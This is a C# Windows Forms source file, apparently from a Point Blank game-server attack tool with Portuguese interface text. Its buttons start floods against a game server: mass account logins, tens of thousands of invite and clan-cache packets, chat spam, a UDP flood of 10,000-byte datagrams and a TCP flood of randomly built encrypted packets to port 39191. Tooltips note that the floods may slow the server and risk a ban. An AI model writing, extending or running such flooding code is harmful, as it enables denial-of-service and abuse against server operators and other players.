using PointBlank___Machine.Pacotes.GAME.ACK;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace PointBlank___Machine
{
    public partial class Comandos : Form
    {
        public SendPacket send = new SendPacket(), BeginSend = new SendPacket(), receive = new SendPacket();
        public bool Aguardar = false;
        public volatile Room room;
        public Comandos()
        {
            InitializeComponent();
        }
        #region Buttons
        private void button1_Click(object sender, EventArgs e)
        {
            label1.Text = "Comando Iniciado.";
            Program.Form1.WriteSender("Tentando Flodar Contas.", Color.Yellow);
            new Thread(new ThreadStart(Program.Form1.AccessAuth)).Start();
            Close();
        }
        private void button2_Click(object sender, EventArgs e)
        {
            label1.Text = "Comando Iniciado.";
            new Thread(new ThreadStart(InvitePlayer)).Start();
        }
        private void button3_Click(object sender, EventArgs e)
        {
            label1.Text = "Comando Iniciado.";
            new Thread(new ThreadStart(CacheClan)).Start();
        }
        private void button4_Click(object sender, EventArgs e)
        {
            label1.Text = "Comando Iniciado.";
            new Thread(new ThreadStart(ClanPage)).Start();
        }
        private void button5_Click(object sender, EventArgs e)
        {
            label1.Text = "Comando Iniciado.";
            new Thread(() =>
            {
                Application.EnableVisualStyles();
                Application.Run(new Robô_Lobby());
            }).Start();
            Close();
        }
        private void button6_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("Você deseja Finalizar?", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
            {
                Close();
            }
        }
        private void button7_Click(object sender, EventArgs e)
        {
            label1.Text = "Comando Iniciado.";
            if (Conexão.INSTs().player != null)
            {
                new Thread(() =>
                {
                    Application.EnableVisualStyles();
                    Application.Run(room = new Room());

                }).Start();
                Close();
            }
            else
            {
                Program.Form1.WriteSender($"Você precisa está Online no jogo.", Color.Red);
            }
        }
        private void button8_Click(object sender, EventArgs e)
        {
            label1.Text = "Comando Iniciado.";
            if (Conexão.INSTs().player != null)
            {
                new Thread(() =>
                {
                    Application.EnableVisualStyles();
                    Application.Run(new Criar_Clã());

                }).Start();
                Close();
            }
            else
            {
                Program.Form1.WriteSender($"Você precisa está Online no jogo.", Color.Red);
            }
        }
        private void button9_Click(object sender, EventArgs e)
        {
            switch (Aguardar)
            {
                case true:
                    {
                        label1.Text = "Comando Travado."; Aguardar = true; break;
                    }
                case false:
                    {
                        label1.Text = "Comando Destravado."; Aguardar = false; break;
                    }
            }
        }
        private void button10_Click(object sender, EventArgs e)
        {
            label1.Text = "Comando Iniciado.";
            Player player = Conexão.INSTs().player;
            if (player != null)
                player.GameClient.SendPacket(new ROOM_GET_LOBBY_USER_LIST_ACK().Write());
            else
                Program.Form1.WriteSender($"Você precisa está Online no jogo.", Color.Red);
            Close();
        }
        private void button11_Click(object sender, EventArgs e)
        {
            new Thread(new ThreadStart(RoomLobby)).Start();
            Close();
        }
        private void button12_Click(object sender, EventArgs e)
        {
            if (Conexão.INSTs().player != null)
            {
                Program.Form1.WriteSender("Digite o id da sala.", Color.Yellow);
            }
            else
                Program.Form1.WriteSender($"Você precisa está Online no jogo.", Color.Red);
            Close();
        }
        private void button13_Click(object sender, EventArgs e)
        {
            if (Conexão.INSTs().player != null)
            {
                Program.Form1.WriteSender("Digite o Nome do amigo.", Color.Yellow);
                Program.Form1.Exceptions = Exceptions.AdicionarAmigos;
                Program.Form1.textBox2.Clear();
            }
            else
                Program.Form1.WriteSender($"Você precisa está Online no jogo.", Color.Red);
            Close();
        }
        private void button14_Click(object sender, EventArgs e)
        {
            if (Conexão.INSTs().player != null)
            {
                label1.Text = "Comando Iniciado.";
                new Thread(() =>
                {
                    Application.EnableVisualStyles();
                    Application.Run(new Create_Box());
                }).Start();
            }
            else
                Program.Form1.WriteSender($"Você precisa está Online no jogo.", Color.Red);
            Close();
        }
        #endregion
        #region user32.dll
        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;
        public const int WM_LBUTTONDOWN = 0x0201;
        [DllImport("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

        [DllImport("user32.dll")]
        public static extern bool ReleaseCapture();

        protected override void WndProc(ref Message m)
        {
            base.WndProc(ref m);
            if (m.Msg == WM_LBUTTONDOWN)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }
        #endregion
        #region Comandos
        public void InvitePlayer()
        {
            for (int i = 0; i <= 50000; i++)
            {
                if (Aguardar)
                    break;
                Player player = Conexão.INSTs().player;
                if (player != null)
                {
                    player.GameClient.SendPacket(new ROOM_INVITE_PLAYERS_ACK(i, (ulong)i).Write());
                    Program.Form1.WriteSender($"Flodando Invites para os players [{i}]", Color.Yellow);
                }
                else
                {
                    Program.Form1.WriteSender($"Você precisa está Online no jogo.", Color.Red);
                    break;
                }
            }
        }
        public void CacheClan()
        {
            for (int i = 0; i < 10000; i++)
            {
                if (Aguardar)
                    break;
                Player player = Conexão.INSTs().player;
                if (player != null)
                {
                    player.GameClient.SendPacket(new CLAN_CLIENT_CLAN_LIST_ACK((ulong)i).Write());
                    Program.Form1.WriteSender($"Flodando Cache do Clan [{i}]", Color.Yellow);
                }
                else
                {
                    Program.Form1.WriteSender($"Você precisa está Online no jogo.", Color.Red);
                    break;
                }
            }
        }
        public void ClanPage()
        {
            Program.Form1.WriteSender("Digite o Texto a flodar...", Color.Yellow);
            Program.Form1.Exceptions = Exceptions.flood;
            Close();
        }
        public void RoomLobby()
        {
            Player player = Conexão.INSTs().player;
            if (player != null)
            {
                player.GameClient.SendPacket(new LOBBY_GET_ROOMLIST_ACK().Write());
            }
            else
            {
                Program.Form1.WriteSender($"Você precisa está Online no jogo.", Color.Red);
            }
        }
        private void groupBox1_Enter(object sender, EventArgs e)
        {
            toolTip1.SetToolTip(button1, "Login: floda varios login no servidor, só funciona em autocreate.");
            toolTip1.SetToolTip(button2, "Invite: Você pode ficar flodando convites no lobby.");
            toolTip1.SetToolTip(button3, "Cache: Você pode ficar flodando cache no clã, talvez deixe lento.");
            toolTip1.SetToolTip(button4, "Chat: FLoda varias mensagem no chat no lobby. 'Cuidado moço oia o BAN!!!'");
            toolTip1.SetToolTip(button5, "Robô: floda varias contas no lobby, só funciona em autocreate.");
            toolTip1.SetToolTip(button6, "Exit: Fechar os comandos.");
            toolTip1.SetToolTip(button7, "Criar Sala: Aqui você pode criar uma sala.");
            toolTip1.SetToolTip(button8, "Criar clã: Aqui você pode criar um clã.");
            toolTip1.SetToolTip(button9, "Stop: Aqui você travar e destravar os flod. [Evita bugs mané, nada é 100%]");
            toolTip1.SetToolTip(button10, "Lobby: Aqui você ver quantos estão no lobby, veja em 'Guia'.");
            toolTip1.SetToolTip(button11, "Salas: Aqui você ver quantas salas estão criadas no lobby, veja em 'Guia'.");
            toolTip1.SetToolTip(button12, "Join: Aqui você pode entrar na sala.");
            toolTip1.SetToolTip(button13, "Amigos: Aqui você pode adicionar algum player.");
            toolTip1.SetToolTip(button15, "Loja: Aqui você pode pegar todas as armas da loja.");
        }

        #endregion
        private void button15_Click(object sender, EventArgs e)
        {
            label1.Text = "Comando Iniciado.";
            Player player = Conexão.INSTs().player;
            if (player != null)
            {
                new Thread(() =>
                {
                    Application.EnableVisualStyles();
                    Application.Run(Program.Form1.Loja = new Loja());

                }).Start();
                player.GameClient.SendPacket(new SHOP_GET_ACK().Write());
                Close();
            }
            else
            {
                Program.Form1.WriteSender($"Você precisa está Online no jogo.", Color.Red);
            }
        }

        private void button16_Click(object sender, EventArgs e)
        {
            label1.Text = "Comando Iniciado.";
            // getIP();
            ResolutionSocket();
            Application.DoEvents();
        }

        private void button17_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
            for (int index = 0; index < 100000; index++)
            {
                try
                {
                    if (Aguardar)
                        break;
                    IPEndPoint ipe = new IPEndPoint(IPAddress.Parse(Carregar.INTs().IP), 0);
                    UdpClient udpClient = new UdpClient();
                    byte[] testes = new byte[10000]; //Length abaixo de  16
                    udpClient.BeginSend(testes, testes.Length, ipe, (result) =>
                    {
                        if (result.IsCompleted)
                        {
                            Thread.Sleep(200);
                            udpClient.EndSend(result);
                            Program.Form1.ChatSender($"[Sistema UDP] Flooding Iniciado... [{index}] [{testes.Length}] '200s'", "lobby");
                        }
                    }, 
                    udpClient);

                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                    break;
                }
                Application.DoEvents();
            }
        }

        private void button18_Click(object sender, EventArgs e)
        {
            try
            {
                if (Process.GetProcessesByName("MachineBytes").Length < 3)
                {
                    Process.Start(Application.StartupPath + @"\\Files\\MachineBytes.exe");
                    Close();
                }
            }
            catch
            {
                MessageBox.Show("applicativo não encontrado! verifique os seus arquivos.");
            }
        }

        public void ResolutionSocket()
        {
            for (int i = 0; i <= 10000; i++)
            {
                try
                {
                    if (Aguardar)
                        break;
                    IPEndPoint ipe = new IPEndPoint(IPAddress.Parse(Carregar.INTs().IP), 39191);
                    Socket tempSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    tempSocket.Connect(ipe);
                    byte[] resultado = ArrayBytes();
                    if (tempSocket.Connected)
                    {
                        tempSocket.BeginSend(resultado, 0, resultado.Length, SocketFlags.None, out SocketError error, (result) =>
                        {
                            try
                            {
                                if (result.IsCompleted)
                                    tempSocket.EndSend(result, out error);
                                Program.Form1.ChatSender($"[Sistema Socket] Flooding Iniciado... [{i}] [{resultado.Length}]", "lobby");
                            }
                            catch (Exception ex)
                            {
                                throw ex;
                            }
                        },
                        tempSocket);
                    }
                    else
                    {
                        Program.Form1.ChatSender($"{ipe}: Error...", "lobby");
                        break;
                    }
                }
                catch (Exception ex)
                {
                    new _Message().Error($"Error: {ex.ToString()}");
                    break;
                }
                Application.DoEvents();
            }
            Close();
        }
        public byte[] ArrayBytes()
        {
            send.WriteC((byte)new Random().Next(0, 255));
            BeginSend.WriteH((short)new Random().Next(0, 50000));
            BeginSend.WriteH(0);
            BeginSend.WriteB(send.stream.ToArray());
            byte[] data = Dados.Encrypt(BeginSend.stream.ToArray(), 2); // Encrypt
            receive.WriteH((ushort)(data.Length - 2 | 32768)); //0x8000
            receive.WriteB(data);
            return receive.stream.ToArray();
        }
    }
}
